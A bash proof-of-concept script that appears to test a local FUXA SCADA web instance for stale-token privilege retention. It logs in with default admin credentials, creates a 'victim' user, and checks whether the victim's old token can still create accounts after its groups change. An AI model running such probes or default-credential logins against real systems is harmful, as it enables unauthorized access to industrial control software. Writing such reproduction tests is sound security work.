#!/bin/bash
P=$1
tok() { curl -s -X POST localhost:$P/api/signin -H 'content-type: application/json' -d "{\"username\":\"$1\",\"password\":\"$2\"}" | python3 -c 'import json,sys;print(json.load(sys.stdin)["data"]["token"])'; }
code() { curl -s -o /tmp/fuxa-body -w "%{http_code}" "$@"; }
A=$(tok admin 123456)
echo "create victim groups=-1: $(code -X POST localhost:$P/api/users -H "x-access-token: $A" -H 'content-type: application/json' -d '{"params":{"username":"victim","fullname":"v","password":"victim","groups":-1,"info":"{}"}}')"
V=$(tok victim victim)
echo "source, victim stale token, POST /api/users upsert probe: $(code -X POST localhost:$P/api/users -H "x-access-token: $V" -H 'content-type: application/json' -d '{"params":{"username":"probe","fullname":"p","password":"probe","groups":1,"info":"{}"}}')"
echo "transition, admin sets victim groups=1: $(code -X POST localhost:$P/api/users -H "x-access-token: $A" -H 'content-type: application/json' -d '{"params":{"username":"victim","fullname":"v","groups":1,"info":"{}"}}')"
echo "follow-up, victim stale token: $(code -X POST localhost:$P/api/users -H "x-access-token: $V" -H 'content-type: application/json' -d '{"params":{"username":"probe","fullname":"p","password":"probe","groups":1,"info":"{}"}}') $(cat /tmp/fuxa-body)"
V2=$(tok victim victim)
echo "fresh login token: $(code -X POST localhost:$P/api/users -H "x-access-token: $V2" -H 'content-type: application/json' -d '{"params":{"username":"probe","fullname":"p","password":"probe","groups":1,"info":"{}"}}') $(cat /tmp/fuxa-body)"
echo "stale token GET /api/users: $(code localhost:$P/api/users -H "x-access-token: $V")"
